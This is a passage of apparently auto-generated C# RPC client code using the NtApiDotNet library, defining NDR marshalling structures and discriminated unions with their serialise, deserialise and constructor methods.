Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteInt32(Member0);\n            m.WriteInt32(Member4);\n            m.WriteInt32(Member8);\n            m.Write_103(NtApiDotNet.Win32.Rpc.RpcUtils.CheckNull(Member10, \"Member10\"), Member8);\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadInt32();\n            Member4 = u.ReadInt32();\n            Member8 = u.ReadInt32();\n            Member10 = u.Read_103();\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrConformantStructure.GetConformantDimensions()\n        {\n            return 1;\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public int Member0;\n        public int Member4;\n        public int Member8;\n        public Struct_47[] Member10;\n        public static Struct_46 CreateDefault()\n        {\n            Struct_46 ret = new Struct_46();\n            ret.Member10 = new Struct_47[0];\n            return ret;\n        }\n        public Struct_46(int Member0, int Member4, int Member8, Struct_47[] Member10)\n        {\n            this.Member0 = Member0;\n            this.Member4 = Member4;\n            this.Member8 = Member8;\n            this.Member10 = Member10;\n        }\n    }\n    public struct Struct_47 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteInt16(Member0);\n            m.WriteInt16(Member2);\n            m.WriteInt32(Member4);\n            m.WriteInt32(Member8);\n            m.Write_48(Member10, NtApiDotNet.Win32.Rpc.RpcUtils.OpBitwiseAnd(Member4, 65535));\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadInt16();\n            Member2 = u.ReadInt16();\n            Member4 = u.ReadInt32();\n            Member8 = u.ReadInt32();\n            Member10 = u.Read_48();\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public short Member0;\n        public short Member2;\n        public int Member4;\n        public int Member8;\n        public Union_48 Member10;\n        public static Struct_47 CreateDefault()\n        {\n            return new Struct_47();\n        }\n        public Struct_47(short Member0, short Member2, int Member4, int Member8, Union_48 Member10)\n        {\n            this.Member0 = Member0;\n            this.Member2 = Member2;\n            this.Member4 = Member4;\n            this.Member8 = Member8;\n            this.Member10 = Member10;\n        }\n    }\n    public struct Union_48 : NtApiDotNet.Ndr.Marshal.INdrNonEncapsulatedUnion\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            throw new System.NotImplementedException();\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrNonEncapsulatedUnion.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m, long l)\n        {\n            Selector = ((uint)(l));\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteUInt32(Selector);\n            if ((Selector == 2))\n            {\n                m.Write_49(Arm_2);\n                goto done;\n            }\n            if ((Selector == 1))\n            {\n                m.Write_104(NtApiDotNet.Win32.Rpc.RpcUtils.CheckNull(Arm_1, \"Arm_1\"));\n                goto done;\n            }\n            if ((Selector == 4))\n            {\n                m.Write_50(Arm_4);\n                goto done;\n            }\n            if ((Selector == 3))\n            {\n                m.Write_0(Arm_3);\n                goto done;\n            }\n            if ((Selector == 5))\n            {\n                m.Write_18(Arm_5);\n                goto done;\n            }\n            throw new System.ArgumentException(\"No matching union selector when marshaling Union_48\");\n        done:\n            return;\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Selector = u.ReadUInt32();\n            if ((Selector == 2))\n            {\n                Arm_2 = u.Read_49();\n                goto done;\n            }\n            if ((Selector == 1))\n            {\n                Arm_1 = u.Read_104();\n                goto done;\n            }\n            if ((Selector == 4))\n            {\n                Arm_4 = u.Read_50();\n                goto done;\n            }\n            if ((Selector == 3))\n            {\n                Arm_3 = u.Read_0();\n                goto done;\n            }\n            if ((Selector == 5))\n            {\n                Arm_5 = u.Read_18();\n                goto done;\n            }\n            throw new System.ArgumentException(\"No matching union selector when marshaling Union_48\");\n        done:\n            return;\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        private uint Selector;\n        public Struct_49 Arm_2;\n        public int[] Arm_1;\n        public Struct_50 Arm_4;\n        public Struct_0 Arm_3;\n        public Struct_18 Arm_5;\n        public static Union_48 CreateDefault()\n        {\n            Union_48 ret = new Union_48();\n            ret.Arm_1 = new int[2];\n            return ret;\n        }\n        public Union_48(uint Selector, Struct_49 Arm_2, int[] Arm_1, Struct_50 Arm_4, Struct_0 Arm_3, Struct_18 Arm_5)\n        {\n            this.Selector = Selector;\n            this.Arm_2 = Arm_2;\n            this.Arm_1 = Arm_1;\n            this.Arm_4 = Arm_4;\n            this.Arm_3 = Arm_3;\n            this.Arm_5 = Arm_5;\n        }\n    }\n    public struct Struct_49 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteInt32(Member0);\n            m.WriteEmbeddedPointer<char[], long>(Member8, new System.Action<char[], long>(m.Write_105), (Member0 / 2));\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadInt32();\n            Member8 = u.ReadEmbeddedPointer<char[]>(new System.Func<char[]>(u.Read_105), false);\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public int Member0;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<char[]> Member8;\n        public static Struct_49 CreateDefault()\n        {\n            return new Struct_49();\n        }\n        public Struct_49(int Member0, char[] Member8)\n        {\n            this.Member0 = Member0;\n            this.Member8 = Member8;\n        }\n    }\n    public struct Struct_50 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteInt32(Member0);\n            m.WriteEmbeddedPointer<Struct_4>(Member8, new System.Action<Struct_4>(m.Write_4));\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadInt32();\n            Member8 = u.ReadEmbeddedPointer<Struct_4>(new System.Func<Struct_4>(u.Read_4), false);\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public int Member0;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<Struct_4> Member8;\n        public static Struct_50 CreateDefault()\n        {\n            return new Struct_50();\n        }\n        public Struct_50(int Member0, System.Nullable<Struct_4> Member8)\n        {\n            this.Member0 = Member0;\n            this.Member8 = Member8;\n        }\n    }\n    public struct Struct_51 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteInt32(Member0);\n            m.Write_52(Member8, NtApiDotNet.Win32.Rpc.RpcUtils.OpBitwiseAnd(16777215, Member0));\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadInt32();\n            Member8 = u.Read_52();\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public int Member0;\n        public Union_52 Member8;\n        public static Struct_51 CreateDefault()\n        {\n            return new Struct_51();\n        }\n        public Struct_51(int Member0, Union_52 Member8)\n        {\n            this.Member0 = Member0;\n            this.Member8 = Member8;\n        }\n    }\n    public struct Union_52 : NtApiDotNet.Ndr.Marshal.INdrNonEncapsulatedUnion\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            throw new System.NotImplementedException();\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrNonEncapsulatedUnion.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m, long l)\n        {\n            Selector = ((int)(l));\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteInt32(Selector);\n            if ((Selector == 1))\n            {\n                m.WriteEmbeddedPointer<Struct_53>(Arm_1, new System.Action<Struct_53>(m.Write_53));\n                goto done;\n            }\n            if ((Selector == 2))\n            {\n                m.WriteEmbeddedPointer<Struct_54>(Arm_2, new System.Action<Struct_54>(m.Write_54));\n                goto done;\n            }\n            if ((Selector == 3))\n            {\n                m.WriteEmbeddedPointer<Struct_55>(Arm_3, new System.Action<Struct_55>(m.Write_55));\n                goto done;\n            }\n            if ((Selector == 16777215))\n            {\n                m.WriteEmbeddedPointer<Struct_56>(Arm_16777215, new System.Action<Struct_56>(m.Write_56));\n                goto done;\n            }\n            throw new System.ArgumentException(\"No matching union selector when marshaling Union_52\");\n        done:\n            return;\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Selector = u.ReadInt32();\n            if ((Selector == 1))\n            {\n                Arm_1 = u.ReadEmbeddedPointer<Struct_53>(new System.Func<Struct_53>(u.Read_53), false);\n                goto done;\n            }\n            if ((Selector == 2))\n            {\n                Arm_2 = u.ReadEmbeddedPointer<Struct_54>(new System.Func<Struct_54>(u.Read_54), false);\n                goto done;\n            }\n            if ((Selector == 3))\n            {\n                Arm_3 = u.ReadEmbeddedPointer<Struct_55>(new System.Func<Struct_55>(u.Read_55), false);\n                goto done;\n            }\n            if ((Selector == 16777215))\n            {\n                Arm_16777215 = u.ReadEmbeddedPointer<Struct_56>(new System.Func<Struct_56>(u.Read_56), false);\n                goto done;\n            }\n            throw new System.ArgumentException(\"No matching union selector when marshaling Union_52\");\n        done:\n            return;\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        private int Selector;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<Struct_53> Arm_1;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<Struct_54> Arm_2;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<Struct_55> Arm_3;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<Struct_56> Arm_16777215;\n        public static Union_52 CreateDefault()\n        {\n            return new Union_52();\n        }\n        public Union_52(int Selector, System.Nullable<Struct_53> Arm_1, System.Nullable<Struct_54> Arm_2, System.Nullable<Struct_55> Arm_3, System.Nullable<Struct_56> Arm_16777215)\n        {\n            this.Selector = Selector;\n            this.Arm_1 = Arm_1;\n            this.Arm_2 = Arm_2;\n            this.Arm_3 = Arm_3;\n            this.Arm_16777215 = Arm_16777215;\n        }\n    }\n    public struct Struct_53 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteEmbeddedPointer<string>(Member0, new System.Action<string>(m.WriteTerminatedString));\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member0;\n        public static Struct_53 CreateDefault()\n        {\n            return new Struct_53();\n        }\n        public Struct_53(string Member0)\n        {\n            this.Member0 = Member0;\n        }\n    }\n    public struct Struct_54 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteEmbeddedPointer<string>(Member0, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member8, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member10, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteInt32(Member18);\n            m.WriteInt32(Member1C);\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member8 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member10 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member18 = u.ReadInt32();\n            Member1C = u.ReadInt32();\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member0;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member8;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member10;\n        public int Member18;\n        public int Member1C;\n        public static Struct_54 CreateDefault()\n        {\n            return new Struct_54();\n        }\n        public Struct_54(string Member0, string Member8, string Member10, int Member18, int Member1C)\n        {\n            this.Member0 = Member0;\n            this.Member8 = Member8;\n            this.Member10 = Member10;\n            this.Member18 = Member18;\n            this.Member1C = Member1C;\n        }\n    }\n    public struct Struct_55 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteInt32(Member0);\n            m.WriteEmbeddedPointer<string>(Member8, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteInt32(Member10);\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadInt32();\n            Member8 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member10 = u.ReadInt32();\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public int Member0;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member8;\n        public int Member10;\n        public static Struct_55 CreateDefault()\n        {\n            return new Struct_55();\n        }\n        public Struct_55(int Member0, string Member8, int Member10)\n        {\n            this.Member0 = Member0;\n            this.Member8 = Member8;\n            this.Member10 = Member10;\n        }\n    }\n    public struct Struct_56 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteEmbeddedPointer<string>(Member0, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteInt32(Member8);\n            m.WriteEmbeddedPointer<sbyte>(Member10, new System.Action<sbyte>(m.WriteSByte));\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member8 = u.ReadInt32();\n            Member10 = u.ReadEmbeddedPointer<sbyte>(new System.Func<sbyte>(u.ReadSByte), false);\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member0;\n        public int Member8;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<sbyte> Member10;\n        public static Struct_56 CreateDefault()\n        {\n            return new Struct_56();\n        }\n        public Struct_56(string Member0, int Member8, System.Nullable<sbyte> Member10)\n        {\n            this.Member0 = Member0;\n            this.Member8 = Member8;\n            this.Member10 = Member10;\n        }\n    }\n    public struct Struct_57 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteInt32(Member0);\n            m.WriteEmbeddedPointer<sbyte[], long>(Member8, new System.Action<sbyte[], long>(m.Write_95), Member0);\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadInt32();\n            Member8 = u.ReadEmbeddedPointer<sbyte[]>(new System.Func<sbyte[]>(u.Read_95), false);\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public int Member0;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<sbyte[]> Member8;\n        public static Struct_57 CreateDefault()\n        {\n            return new Struct_57();\n        }\n        public Struct_57(int Member0, sbyte[] Member8)\n        {\n            this.Member0 = Member0;\n            this.Member8 = Member8;\n        }\n    }\n    public struct Union_58 : NtApiDotNet.Ndr.Marshal.INdrNonEncapsulatedUnion\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            throw new System.NotImplementedException();\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrNonEncapsulatedUnion.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m, long l)\n        {\n            Selector = ((uint)(l));\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteUInt32(Selector);\n            if ((Selector == 0))\n            {\n                m.WriteEmbeddedPointer<Struct_46>(Arm_0, new System.Action<Struct_46>(m.Write_46));\n                goto done;\n            }\n            throw new System.ArgumentException(\"No matching union selector when marshaling Union_58\");\n        done:\n            return;\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Selector = u.ReadUInt32();\n            if ((Selector == 0))\n            {\n                Arm_0 = u.ReadEmbeddedPointer<Struct_46>(new System.Func<Struct_46>(u.Read_46), false);\n                goto done;\n            }\n            throw new System.ArgumentException(\"No matching union selector when marshaling Union_58\");\n        done:\n            return;\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        private uint Selector;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<Struct_46> Arm_0;\n        public static Union_58 CreateDefault()\n        {\n            return new Union_58();\n        }\n        public Union_58(uint Selector, System.Nullable<Struct_46> Arm_0)\n        {\n            this.Selector = Selector;\n            this.Arm_0 = Arm_0;\n        }\n    }\n    public struct Struct_59 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteInt32(Member0);\n            m.Write_60(Member8, Member0);\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadInt32();\n            Member8 = u.Read_60();\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public int Member0;\n        public Union_60 Member8;\n        public static Struct_59 CreateDefault()\n        {\n            return new Struct_59();\n        }\n        public Struct_59(int Member0, Union_60 Member8)\n        {\n            this.Member0 = Member0;\n            this.Member8 = Member8;\n        }\n    }\n    public struct Union_60 : NtApiDotNet.Ndr.Marshal.INdrNonEncapsulatedUnion\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            throw new System.NotImplementedException();\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrNonEncapsulatedUnion.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m, long l)\n        {\n            Selector = ((uint)(l));\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteUInt32(Selector);\n            if ((Selector == 1))\n            {\n                m.WriteEmbeddedPointer<Struct_61>(Arm_1, new System.Action<Struct_61>(m.Write_61));\n                goto done;\n            }\n            if ((Selector == 2))\n            {\n                m.WriteEmbeddedPointer<Struct_62>(Arm_2, new System.Action<Struct_62>(m.Write_62));\n                goto done;\n            }\n            if ((Selector == 3))\n            {\n                m.WriteEmbeddedPointer<Struct_63>(Arm_3, new System.Action<Struct_63>(m.Write_63));\n                goto done;\n            }\n            if ((Selector == 4))\n            {\n                m.WriteEmbeddedPointer<Struct_64>(Arm_4, new System.Action<Struct_64>(m.Write_64));\n                goto done;\n            }\n            throw new System.ArgumentException(\"No matching union selector when marshaling Union_60\");\n        done:\n            return;\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Selector = u.ReadUInt32();\n            if ((Selector == 1))\n            {\n                Arm_1 = u.ReadEmbeddedPointer<Struct_61>(new System.Func<Struct_61>(u.Read_61), false);\n                goto done;\n            }\n            if ((Selector == 2))\n            {\n                Arm_2 = u.ReadEmbeddedPointer<Struct_62>(new System.Func<Struct_62>(u.Read_62), false);\n                goto done;\n            }\n            if ((Selector == 3))\n            {\n                Arm_3 = u.ReadEmbeddedPointer<Struct_63>(new System.Func<Struct_63>(u.Read_63), false);\n                goto done;\n            }\n            if ((Selector == 4))\n            {\n                Arm_4 = u.ReadEmbeddedPointer<Struct_64>(new System.Func<Struct_64>(u.Read_64), false);\n                goto done;\n            }\n            throw new System.ArgumentException(\"No matching union selector when marshaling Union_60\");\n        done:\n            return;\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        private uint Selector;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<Struct_61> Arm_1;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<Struct_62> Arm_2;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<Struct_63> Arm_3;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<Struct_64> Arm_4;\n        public static Union_60 CreateDefault()\n        {\n            return new Union_60();\n        }\n        public Union_60(uint Selector, System.Nullable<Struct_61> Arm_1, System.Nullable<Struct_62> Arm_2, System.Nullable<Struct_63> Arm_3, System.Nullable<Struct_64> Arm_4)\n        {\n            this.Selector = Selector;\n            this.Arm_1 = Arm_1;\n            this.Arm_2 = Arm_2;\n            this.Arm_3 = Arm_3;\n            this.Arm_4 = Arm_4;\n        }\n    }\n    public struct Struct_61 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteInt32(Member0);\n            m.WriteEmbeddedPointer<string>(Member8, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteEmbeddedPointer<string>(Member10, new System.Action<string>(m.WriteTerminatedString));\n            m.WriteInt32(Member18);\n            m.WriteInt32(Member1C);\n            m.WriteInt32(Member20);\n            m.WriteInt16(Member24);\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadInt32();\n            Member8 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member10 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n            Member18 = u.ReadInt32();\n            Member1C = u.ReadInt32();\n            Member20 = u.ReadInt32();\n            Member24 = u.ReadInt16();\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public int Member0;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member8;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member10;\n        public int Member18;\n        public int Member1C;\n        public int Member20;\n        public short Member24;\n        public static Struct_61 CreateDefault()\n        {\n            return new Struct_61();\n        }\n        public Struct_61(int Member0, string Member8, string Member10, int Member18, int Member1C, int Member20, short Member24)\n        {\n            this.Member0 = Member0;\n            this.Member8 = Member8;\n            this.Member10 = Member10;\n            this.Member18 = Member18;\n            this.Member1C = Member1C;\n            this.Member20 = Member20;\n            this.Member24 = Member24;\n        }\n    }\n    public struct Struct_62 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteInt64(Member0);\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadInt64();\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 8;\n        }\n        public long Member0;\n        public static Struct_62 CreateDefault()\n        {\n            return new Struct_62();\n        }\n        public Struct_62(long Member0)\n        {\n            this.Member0 = Member0;\n        }\n    }\n    public struct Struct_63 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void 